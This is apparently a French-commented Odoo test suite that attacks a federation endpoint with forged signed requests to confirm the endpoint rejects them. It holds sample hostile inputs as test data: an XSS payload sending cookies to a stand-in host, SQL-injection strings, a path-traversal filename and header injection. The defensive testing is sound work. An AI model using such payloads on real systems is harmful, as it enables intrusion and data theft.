"""La porte publique, attaquée depuis l'extérieur.

Ces essais ne vérifient pas que la fédération marche : ils vérifient qu'elle
refuse. Tout passe par la vraie route HTTP signée, avec des enveloppes forgées
à la main, parce qu'un pair hostile n'utilise pas notre client.

Le fil conducteur : **le réseau ne doit jamais choisir**. Ni le modèle touché,
ni la méthode appelée, ni l'auteur d'un message, ni la quantité de travail
qu'on accepte de faire.
"""

import base64
import json
import time

import requests

from odoo.tests import tagged

from ..models import transport
from .test_federation import TestFederation


@tagged("post_install", "-at_install", "federation", "federation_security")
class TestFederationSecurite(TestFederation):

    # --- Forger une enveloppe, comme le ferait un pair hostile ---------------------
    ABSENT = object()

    def _envoyer(self, kind, data=None, sender_ref=None, peer=None, secret=None,
                 uuid=None, protocol=ABSENT, route="inbox"):
        peer = peer or self.peer_a
        enveloppe = {
            "protocol": transport.PROTOCOL if protocol is self.ABSENT else protocol,
            "kind": kind, "sender_ref": sender_ref, "remote_ref": None,
            "data": data if data is not None else {},
        }
        body = transport.canonical_body(enveloppe)
        ts, nonce = int(time.time()), transport.new_nonce()
        headers = {
            "Content-Type": "application/json",
            transport.HEADER_PEER: uuid or peer.uuid,
            transport.HEADER_TIMESTAMP: str(ts),
            transport.HEADER_NONCE: nonce,
            transport.HEADER_SIGNATURE: transport.sign(
                secret or peer.sudo().secret, ts, nonce, body),
        }
        self.env.flush_all()
        return requests.post(f"{self.base_url()}/federation/v1/{route}",
                             data=body, headers=headers, timeout=20)

    def _corps(self, reponse):
        try:
            return reponse.json()
        except ValueError:
            return {}

    # --- 1. Ce que le réseau ne choisit pas ----------------------------------------
    def test_s01_un_genre_dont_le_modele_n_est_pas_federable_est_refuse(self):
        """Un pair qui nomme un modèle réel mais non fédérable ne doit rien obtenir.

        C'est l'attaque la plus directe sur un lien polymorphe : si le genre
        désignait le modèle, il suffirait de dire « res.users » pour se faire
        créer un utilisateur.
        """
        for genre in ("res.users.share", "res_users.share", "ir.model.share",
                      "partner.share", "users.share"):
            r = self._envoyer(genre, {"name": "tentative"}, sender_ref="1")
            self.assertIn(r.status_code, (404, 422), f"{genre} a été accepté : {r.text}")
            self.assertNotIn("res.users", r.text)

    def test_s02_un_verbe_hors_du_contrat_ne_se_fait_pas_appeler(self):
        """Le verbe ne doit pas servir à choisir la méthode par son nom."""
        task = self._share()
        avant = task.name
        for verbe in ("unlink", "write", "silent", "share_note", "mirror_name",
                      "check_writer", "receive"):
            r = self._envoyer(f"task.{verbe}", {"name": "écrasé"}, sender_ref=str(task.id))
            self.assertIn(r.status_code, (404, 422), f"task.{verbe} a été accepté : {r.text}")
        task.invalidate_recordset()
        self.assertEqual(task.name, avant)

    def test_s03_un_protocole_inconnu_est_refuse(self):
        for faux in ("symbifox-federation/99", "symbifox-federation/", "", None, 1, {"a": 1}):
            r = self._envoyer("ping", protocol=faux)
            self.assertEqual(r.status_code, 422, f"protocole {faux!r} accepté")

    def test_s04_un_verbe_de_genre_ne_vise_pas_le_lien_d_une_autre_famille(self):
        """Une référence de tâche ne doit pas accepter un verbe de livrable."""
        task = self._share()
        lien = self.env["federation.link"].with_context(active_test=False).search(
            [("peer_id", "=", self.peer_a.id), ("remote_ref", "=", str(task.id))], limit=1)
        r = self._envoyer("document.ack", {"by": "quelqu'un"}, sender_ref=str(task.id))
        self.assertEqual(r.status_code, 422, r.text)
        self.assertTrue(lien.exists())

    # --- 2. L'identité des messages -------------------------------------------------
    def test_s05_un_pair_ne_peut_pas_ecrire_au_nom_d_un_employe(self):
        """Se présenter avec le courriel d'un employé ne doit pas suffire.

        Seule la table des personnes appariées du pair désigne quelqu'un d'ici ;
        sinon le message porte le nom de l'organisation du pair, en clair.
        """
        task = self._share()
        mirror = self._mirror_of(task)
        patron = self.env.ref("base.user_admin").partner_id
        patron.email = "patron@interne.test"
        r = self._envoyer("message.new", {
            "body_text": "Approuvez la facture tout de suite.",
            "subtype": "comment",
            "author": {"name": patron.name, "email": "patron@interne.test"},
            "sender_message_ref": "9001",
        }, sender_ref=str(task.id))
        self.assertEqual(r.status_code, 200, r.text)
        message = self.env["mail.message"].search(
            [("model", "=", "project.task"), ("res_id", "=", mirror.id),
             ("body", "ilike", "tout de suite")], limit=1)
        self.assertTrue(message)
        self.assertNotEqual(message.author_id, patron,
                            "🔴 le pair a écrit au nom d'un employé d'ici")
        self.assertEqual(message.author_id, self.peer_a.partner_id)
        self.assertIn(self.peer_a.name, message.body,
                      "et le corps annonce de qui ça vient vraiment")

    def test_s06_un_message_rejoue_ne_se_dedouble_pas(self):
        task = self._share()
        mirror = self._mirror_of(task)
        charge = {"body_text": "Un seul exemplaire.", "subtype": "comment",
                  "author": {"name": "Le pair", "email": "x@pair.test"},
                  "sender_message_ref": "4242"}
        for _essai in range(3):
            r = self._envoyer("message.new", charge, sender_ref=str(task.id))
            self.assertEqual(r.status_code, 200, r.text)
        n = self.env["mail.message"].search_count(
            [("model", "=", "project.task"), ("res_id", "=", mirror.id),
             ("body", "ilike", "Un seul exemplaire")])
        self.assertEqual(n, 1, "un rejeu ne crée pas un deuxième message")

    # --- 3. Ce qui arrive du réseau n'est jamais du balisage ------------------------
    def test_s07_aucun_champ_recu_ne_rend_de_balisage(self):
        poison = '<img src=x onerror="fetch(\'//x.test?c=\'+document.cookie)">'
        r = self._envoyer("task.share", {
            "name": f"Titre {poison}", "description_text": f"Corps {poison}",
            "priority": "1", "state": "01_in_progress", "day": "2026-10-01",
            "url": "javascript:alert(1)",
        }, sender_ref="7001")
        self.assertEqual(r.status_code, 200, r.text)
        lien = self.env["federation.link"].search(
            [("peer_id", "=", self.peer_a.id), ("remote_ref", "=", "7001")], limit=1)
        miroir = lien._record()
        # Le nom est un champ texte : Odoo l'échappe au rendu, et un titre légitime
        # peut contenir « < » (« Migration <200 lignes »). Ce qu'on exige, c'est que
        # le champ HTML, lui, n'ait aucune balise vivante.
        # « onerror= » apparaît bien dans le texte, mais à l'intérieur d'un
        # « &lt;img … &gt; » : c'est du texte affiché, pas une balise vivante.
        self.assertNotIn("<img", miroir.description or "")
        self.assertIn("Corps", miroir.description or "")
        self.assertIn("&lt;img", miroir.description or "",
                      "le balisage reçu est rendu inerte, pas supprimé en silence")
        self.assertFalse(lien.remote_url, "une URL javascript: n'est pas gardée")

    def test_s08_une_url_de_pair_doit_etre_http_ou_https(self):
        for url in ("javascript:alert(1)", "file:///etc/passwd", "data:text/html,<script>",
                    "ftp://x.test/", "//x.test/", "x" * 4000):
            self.assertFalse(self.env["federation.link"]._safe_url(url), url)
        self.assertEqual(self.env["federation.link"]._safe_url("https://ok.test/x"),
                         "https://ok.test/x")

    # --- 4. La quantité de travail qu'on accepte de faire ---------------------------
    def test_s09_un_champ_demesure_est_tronque_pas_stocke(self):
        r = self._envoyer("task.share", {
            "name": "N" * 100000, "description_text": "D" * 200000,
            "priority": "1", "state": "01_in_progress",
        }, sender_ref="7002")
        self.assertEqual(r.status_code, 200, r.text)
        lien = self.env["federation.link"].search(
            [("peer_id", "=", self.peer_a.id), ("remote_ref", "=", "7002")], limit=1)
        self.assertLessEqual(len(lien._record().name), 500,
                             "le nom reçu est borné, pas stocké tel quel")

    def test_s10_un_lot_de_pieces_jointes_est_plafonne(self):
        task = self._share()
        mirror = self._mirror_of(task)
        petite = base64.b64encode(b"x").decode()
        r = self._envoyer("message.new", {
            "body_text": "Beaucoup de fichiers.", "subtype": "comment",
            "author": {"name": "Le pair", "email": "x@pair.test"},
            "sender_message_ref": "4243",
            "attachments": [{"name": f"f{i}.txt", "size": 1, "data": petite}
                            for i in range(200)],
        }, sender_ref=str(task.id))
        self.assertEqual(r.status_code, 200, r.text)
        message = self.env["mail.message"].search(
            [("model", "=", "project.task"), ("res_id", "=", mirror.id),
             ("body", "ilike", "Beaucoup de fichiers")], limit=1)
        self.assertLessEqual(len(message.attachment_ids), 20,
                             "🔴 200 pièces jointes acceptées d'un coup")

    def test_s11_une_piece_jointe_ne_sort_pas_du_magasin(self):
        task = self._share()
        mirror = self._mirror_of(task)
        r = self._envoyer("message.new", {
            "body_text": "Nom de fichier hostile.", "subtype": "comment",
            "author": {"name": "Le pair", "email": "x@pair.test"},
            "sender_message_ref": "4244",
            "attachments": [{"name": "../../../../etc/passwd", "size": 3,
                             "data": base64.b64encode(b"abc").decode()},
                            {"name": "a\x00b.txt", "size": 3,
                             "data": base64.b64encode(b"abc").decode()}],
        }, sender_ref=str(task.id))
        self.assertEqual(r.status_code, 200, r.text)
        message = self.env["mail.message"].search(
            [("model", "=", "project.task"), ("res_id", "=", mirror.id),
             ("body", "ilike", "Nom de fichier hostile")], limit=1)
        self.assertEqual(len(message.attachment_ids), 2,
                         "🔴 un NUL dans un nom de fichier faisait tomber tout le message")
        for att in message.attachment_ids:
            self.assertNotIn("\x00", att.name, "🔴 un NUL survit dans un nom")
            self.assertNotIn("\n", att.name)
            chemin = att.sudo()._full_path(att.store_fname) if att.store_fname else ""
            if chemin:
                self.assertIn("/filestore/", chemin,
                              "🔴 une pièce jointe écrite hors du magasin")

    def test_s12_une_date_forgee_ne_passe_pas(self):
        for valeur in ("2026-13-45 99:99:99", "'; DROP TABLE mail_message; --",
                       "2026-10-01", 12345, None, {"a": 1}):
            self.assertFalse(transport.valid_datetime(valeur), repr(valeur))
        self.assertEqual(transport.valid_datetime("2026-10-01 12:00:00"),
                         "2026-10-01 12:00:00")

    def test_s13_un_jour_forge_ne_passe_pas(self):
        for valeur in ("2026-13-45", "hier", "'; DELETE FROM project_task; --", 20261001):
            self.assertIsNot(transport.valid_day(valeur), "2026-10-01")
        self.assertEqual(transport.valid_day("2026-10-01"), "2026-10-01")

    # --- 5. Ce que le refus laisse deviner ------------------------------------------
    def test_s14_un_refus_de_consentement_ne_dit_pas_ce_qui_existe(self):
        """403 doit tomber AVANT la résolution du lien : sinon la différence entre
        403 et 404 dit au pair si une référence existe ici."""
        task = self._share()
        self.peer_a.write({"inbound_policy": "listed", "inbound_model_ids": [(5, 0, 0)]})
        connue = self._envoyer("task.state", {"state": "1_done"}, sender_ref=str(task.id))
        inconnue = self._envoyer("task.state", {"state": "1_done"}, sender_ref="999999999")
        self.assertEqual(connue.status_code, 403)
        self.assertEqual(inconnue.status_code, 403)
        self.assertEqual(connue.text, inconnue.text,
                         "🔴 la réponse diffère selon que la référence existe")

    def test_s15_les_erreurs_ne_nomment_ni_projet_ni_modele_ni_identifiant(self):
        reponses = [
            self._envoyer("task.state", {"state": "1_done"}, sender_ref="999999999"),
            self._envoyer("licorne.share", {"name": "x"}, sender_ref="1"),
            self._envoyer("task.share", {}, sender_ref=None),
        ]
        for r in reponses:
            texte = r.text.lower()
            for fuite in ("project", "projet local", "traceback", "psycopg",
                          "select ", "odoo.addons", "/mnt/", "res.users"):
                self.assertNotIn(fuite, texte, f"fuite « {fuite} » dans {r.text[:200]}")

    def test_s16_un_jumelage_refuse_ne_distingue_pas_les_causes(self):
        url = self.base_url() + "/federation/v1/handshake"
        base = {"protocol": transport.PROTOCOL, "part": transport.new_secret(),
                "uuid": "00000000000000000000000000000000",
                "base_url": self.base_url(), "name": "Intrus"}
        reponses = []
        for code in ("code-inexistant", "", "x" * 500):
            r = requests.post(url, data=transport.canonical_body(dict(base, code=code)),
                              headers={"Content-Type": "application/json"}, timeout=20)
            reponses.append((r.status_code, r.text))
        self.assertEqual(len({t for _s, t in reponses}), 1,
                         "les refus de jumelage se distinguent : %s" % reponses)
        self.assertEqual({s for s, _t in reponses}, {403})

    # --- 6. L'authentification, au-delà des bases -----------------------------------
    def test_s17_le_secret_d_un_jumelage_ne_vaut_pas_pour_un_autre(self):
        """⚠️ peer_a et peer_b sont les DEUX BOUTS du même jumelage (le banc fédère
        la base avec elle-même) : ils partagent le secret par construction. Ce qui
        doit être vrai, c'est qu'un secret né d'un AUTRE jumelage ne passe pas."""
        tiers = self.env["federation.peer"].create({
            "name": "Un troisième", "mirror_user_id": self.admin.id})
        tiers.action_generate_invitation()
        wiz = self.env["federation.accept.wizard"].create({
            "base_url": self.base_url(), "code": tiers.sudo().invitation_code,
            "name": "Bout du troisième", "mirror_user_id": self.admin.id})
        wiz.action_accept()
        self.env.invalidate_all()
        tiers.invalidate_recordset()
        self.assertNotEqual(tiers.sudo().secret, self.peer_a.sudo().secret,
                            "chaque jumelage dérive son propre secret")
        r = self._envoyer("ping", uuid=self.peer_a.uuid, secret=tiers.sudo().secret)
        self.assertEqual(r.status_code, 401,
                         "🔴 le secret d'un jumelage vaut pour l'identifiant d'un autre")

    def test_s18_un_pair_suspendu_ne_passe_plus(self):
        self.peer_a.action_suspend()
        self.env.flush_all()
        r = self._envoyer("ping")
        self.assertEqual(r.status_code, 401)
        self.peer_a.action_reactivate()

    def test_s19_le_corps_signe_est_celui_qui_est_lu(self):
        """Signer une enveloppe et en envoyer une autre doit échouer."""
        honnete = transport.canonical_body(
            {"protocol": transport.PROTOCOL, "kind": "ping", "sender_ref": None,
             "remote_ref": None, "data": {}})
        hostile = transport.canonical_body(
            {"protocol": transport.PROTOCOL, "kind": "task.share", "sender_ref": "8001",
             "remote_ref": None, "data": {"name": "Glissé"}})
        ts, nonce = int(time.time()), transport.new_nonce()
        headers = {"Content-Type": "application/json",
                   transport.HEADER_PEER: self.peer_a.uuid,
                   transport.HEADER_TIMESTAMP: str(ts), transport.HEADER_NONCE: nonce,
                   transport.HEADER_SIGNATURE: transport.sign(
                       self.peer_a.sudo().secret, ts, nonce, honnete)}
        self.env.flush_all()
        r = requests.post(self.base_url() + "/federation/v1/inbox",
                          data=hostile, headers=headers, timeout=20)
        self.assertEqual(r.status_code, 401)
        self.assertFalse(self.env["federation.link"].search(
            [("peer_id", "=", self.peer_a.id), ("remote_ref", "=", "8001")]))

    def test_s20_le_secret_ne_se_lit_pas_sans_etre_administrateur(self):
        from odoo.exceptions import AccessError
        simple = self.env["res.users"].create({
            "name": "Employé simple", "login": "simple.secu",
            "groups_id": [(6, 0, [self.env.ref("base.group_user").id])]})
        # Odoo LÈVE sur une lecture explicite d'un champ à groupe, plutôt que de
        # l'omettre en silence : c'est plus fort, et c'est ce qu'on éprouve.
        for champ in ("secret", "uuid", "remote_uuid", "invitation_code", "handshake_part"):
            with self.assertRaises(AccessError, msg=champ):
                self.peer_a.with_user(simple).read(["name", champ])
        fiche = self.peer_a.with_user(simple).read(["name", "state"])[0]
        self.assertEqual(fiche["name"], self.peer_a.name, "le reste reste lisible")

    def test_s21_le_jumelage_est_reserve_aux_administrateurs(self):
        from odoo.exceptions import AccessError
        simple = self.env["res.users"].create({
            "name": "Employé sans droits", "login": "simple.jumelage",
            "groups_id": [(6, 0, [self.env.ref("base.group_user").id])]})
        peer = self.peer_a.with_user(simple)
        for geste in ("action_generate_invitation", "action_suspend", "action_reactivate",
                      "action_ping", "action_send_invitation"):
            with self.assertRaises(AccessError, msg=geste):
                getattr(peer, geste)()

    # --- 7. Le courriel d'invitation -------------------------------------------------
    def test_s22_une_adresse_d_invitation_forgee_est_refusee(self):
        """🔴 Un saut de ligne dans une adresse ouvre un « Bcc: » dans l'en-tête.
        La bibliothèque de courriel de Python le refuse aujourd'hui, mais une
        garantie qui dépend d'une couche plus basse n'en est pas une."""
        from odoo.exceptions import UserError
        peer = self.env["federation.peer"].create({
            "name": "Pair douteux", "mirror_user_id": self.admin.id})
        for forgee in ("cible@exemple.test\nBcc: victime@ailleurs.test",
                       "cible@exemple.test\r\nBcc: victime@ailleurs.test",
                       "cible@exemple.test victime@ailleurs.test",
                       "pas-une-adresse", "", "   "):
            peer.invitation_email = forgee
            avant = self.env["mail.mail"].search_count([])
            with self.assertRaises(UserError, msg=repr(forgee)):
                peer.action_send_invitation()
            self.assertEqual(self.env["mail.mail"].search_count([]), avant,
                             "rien ne part quand l'adresse est refusée")
        # Une adresse honnête, même entourée d'espaces, passe toujours.
        peer.invitation_email = "  cible@exemple.test  "
        peer.action_send_invitation()
        courriel = self.env["mail.mail"].search([], order="id desc", limit=1)
        self.assertEqual(courriel.email_to, "cible@exemple.test")

    # --- 8. Le pair ne choisit pas où atterrit son miroir -----------------------------
    def test_s23_le_pair_ne_choisit_ni_le_projet_ni_l_assigne(self):
        autre_projet = self.env["project.project"].create({"name": "Projet interdit"})
        r = self._envoyer("task.share", {
            "name": "Je choisis mon projet", "description_text": "",
            "priority": "0", "state": "01_in_progress",
            "project_id": autre_projet.id, "user_ids": [1], "company_id": 1,
            "id": 1, "res_id": 1, "federation_peer_id": 999,
        }, sender_ref="8100")
        self.assertEqual(r.status_code, 200, r.text)
        self.env.invalidate_all()  # le projet miroir est né dans la transaction HTTP
        lien = self.env["federation.link"].search(
            [("peer_id", "=", self.peer_a.id), ("remote_ref", "=", "8100")], limit=1)
        miroir = lien._record()
        self.assertNotEqual(miroir.project_id, autre_projet,
                            "🔴 le pair a choisi le projet d'atterrissage")
        self.assertEqual(miroir.project_id, self.peer_a.mirror_project_id)
        self.assertEqual(miroir.user_ids, self.peer_a.mirror_user_id)
        self.assertEqual(miroir.federation_peer_id, self.peer_a)

    def test_s24_une_charge_qui_n_est_pas_un_objet_ne_fait_pas_tomber_la_porte(self):
        for charge in ("une chaîne", 42, [1, 2, 3], None):
            enveloppe = {"protocol": transport.PROTOCOL, "kind": "task.share",
                         "sender_ref": "8200", "remote_ref": None, "data": charge}
            body = transport.canonical_body(enveloppe)
            ts, nonce = int(time.time()), transport.new_nonce()
            headers = {"Content-Type": "application/json",
                       transport.HEADER_PEER: self.peer_a.uuid,
                       transport.HEADER_TIMESTAMP: str(ts), transport.HEADER_NONCE: nonce,
                       transport.HEADER_SIGNATURE: transport.sign(
                           self.peer_a.sudo().secret, ts, nonce, body)}
            self.env.flush_all()
            r = requests.post(self.base_url() + "/federation/v1/inbox",
                              data=body, headers=headers, timeout=20)
            self.assertIn(r.status_code, (200, 422), f"{charge!r} → {r.status_code}")
            self.assertNotIn("Traceback", r.text)

    def test_s25_un_json_invalide_est_refuse_proprement(self):
        for brut in (b"{pas du json", b"", b"\xff\xfe\x00", b'{"a": ' + b"[" * 5000):
            ts, nonce = int(time.time()), transport.new_nonce()
            headers = {"Content-Type": "application/json",
                       transport.HEADER_PEER: self.peer_a.uuid,
                       transport.HEADER_TIMESTAMP: str(ts), transport.HEADER_NONCE: nonce,
                       transport.HEADER_SIGNATURE: transport.sign(
                           self.peer_a.sudo().secret, ts, nonce, brut)}
            r = requests.post(self.base_url() + "/federation/v1/inbox",
                              data=brut, headers=headers, timeout=20)
            self.assertIn(r.status_code, (401, 422), f"{brut[:20]!r} → {r.status_code}")
            self.assertNotIn("Traceback", r.text)

    # --- 9. Ce que l'audit statique a trouvé, et qui ne se voit pas de l'extérieur ---
    def test_s26_un_envoi_abandonne_ne_garde_pas_sa_charge(self):
        """🔴 Le ménage ne retirait que les envois RÉUSSIS. Un abandon gardait son
        message et ses fichiers en base64 pour toujours, dans une table que
        personne ne regarde."""
        from datetime import timedelta
        from odoo import fields as odoo_fields
        from odoo.exceptions import UserError
        from ..models.federation_outbox import PAYLOAD_RETIREE
        task = self._share()
        lien = self.env["federation.link"].search(
            [("res_model", "=", "project.task"), ("res_id", "=", task.id)], limit=1)
        entree = self.env["federation.outbox"].create({
            "peer_id": self.peer_b.id, "link_id": lien.id, "kind": "message.new",
            "payload": json.dumps({"body_text": "secret", "attachments": [
                {"name": "confidentiel.pdf", "size": 3, "data": "YWJj"}]}),
            "state": "failed"})
        # `create_date` est un champ magique : on le pose en SQL pour que le
        # vieillissement soit sans ambiguïté plutôt que dépendant d'un write toléré.
        self.env.cr.execute(
            "UPDATE federation_outbox SET create_date = %s WHERE id = %s",
            (odoo_fields.Datetime.now() - timedelta(days=30), entree.id))
        self.env.invalidate_all()
        self.env["federation.nonce"]._cron_prune()
        entree.invalidate_recordset()
        self.assertTrue(entree.exists(), "la ligne reste : elle est la trace d'un échec")
        self.assertEqual(entree.payload, PAYLOAD_RETIREE)
        self.assertNotIn("confidentiel", entree.payload)
        self.assertNotIn("YWJj", entree.payload)
        with self.assertRaises(UserError):
            entree.action_retry()

    def test_s27_le_pair_ne_choisit_pas_ou_son_message_s_insere(self):
        """🔴 valid_datetime ne vérifiait que la forme : le pair pouvait antidater son
        message sous les nôtres, ou le dater du futur pour rester en tête."""
        task = self._share()
        mirror = self._mirror_of(task)
        for date, attendu in (("2019-01-01 08:00:00", False),
                              ("2099-01-01 08:00:00", False)):
            r = self._envoyer("message.new", {
                "body_text": f"Daté {date}.", "subtype": "comment",
                "author": {"name": "Le pair", "email": "x@pair.test"},
                "sender_message_ref": f"ref-{date}", "date": date,
            }, sender_ref=str(task.id))
            self.assertEqual(r.status_code, 200, r.text)
            message = self.env["mail.message"].search(
                [("model", "=", "project.task"), ("res_id", "=", mirror.id),
                 ("body", "ilike", f"Daté {date}")], limit=1)
            self.assertTrue(message)
            self.assertGreater(message.date.year, 2020,
                               "🔴 un message antidaté de six ans est entré tel quel")
            self.assertLess(message.date.year, 2030,
                            "🔴 un message daté du futur est entré tel quel")

    def test_s28_renvoyer_un_trace_demande_le_meme_role_qu_ouvrir_le_partage(self):
        """⚠️ La deuxième porte doit valoir la première, sinon le rôle ne protège
        que le premier envoi."""
        from odoo.exceptions import AccessError
        if "bf.process" not in self.env:
            self.skipTest("bf_process absent")
        simple = self.env["res.users"].create({
            "name": "Employé sans rôle projet", "login": "simple.trace",
            "groups_id": [(6, 0, [self.env.ref("base.group_user").id])]})
        carte = self.env["bf.process"].create(
            {"name": "Carte à renvoyer", "version": "1.0", "pool_name": "Ici",
             "project_id": self.project.id, "federation_peer_id": self.peer_b.id})
        self._flush()
        with self.assertRaises(AccessError):
            carte.with_user(simple).action_federation_push()

    def test_s29_une_methode_hors_contrat_ne_se_fait_pas_appeler(self):
        """⚠️ La liste blanche des verbes est une défense en profondeur : aujourd'hui
        aucun `_federation_apply_*` n'existe sans être déclaré, donc rien ne la met à
        l'épreuve. On fabrique donc exactement la situation qu'elle existe pour
        empêcher : une méthode ajoutée un jour, et oubliée au contrat.

        Sans la garde, le réseau choisirait la méthode appelée par son nom.
        """
        appels = []

        def _federation_apply_sournois(self, link, data):
            appels.append(data)
            return True

        Tache = type(self.env["project.task"])
        Tache._federation_apply_sournois = _federation_apply_sournois
        self.addCleanup(lambda: delattr(Tache, "_federation_apply_sournois"))

        task = self._share()
        self.assertNotIn("sournois", self.env["project.task"]._federation_verbs,
                         "le verbe n'est pas au contrat, c'est tout l'intérêt")
        r = self._envoyer("task.sournois", {"charge": "utile"}, sender_ref=str(task.id))
        self.assertEqual(r.status_code, 422, r.text)
        self.assertFalse(appels, "🔴 le réseau a fait appeler une méthode hors contrat")
